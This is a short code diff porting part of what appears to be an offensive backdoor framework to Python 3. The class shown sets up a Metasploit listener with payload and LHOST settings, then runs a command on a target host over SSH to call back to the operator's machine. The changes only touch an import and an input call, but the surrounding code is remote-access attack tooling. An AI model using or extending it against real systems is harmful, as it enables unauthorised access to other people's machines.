@@ -1,4 +1,4 @@
-from backdoor import *
+from backdoors.backdoor import *
 
 class Metasploit(Backdoor):
     prompt = Fore.RED + "(msf) " + Fore.BLUE + ">> " + Fore.RESET 
@@ -39,7 +39,7 @@ class Metasploit(Backdoor):
         print("> set PAYLOAD %s" % payload)
         print("> set LHOST %s" % self.core.localIP)
         print("> exploit")
-        raw_input(GOOD + "Press any key to launch exploit once msfconsole is listening...")
+        input(GOOD + "Press any key to launch exploit once msfconsole is listening...")
         target.ssh.exec_command(self.get_command())
         for mod in self.modules.keys():
             print(INFO + "Attempting to execute " + mod.name + " module...")
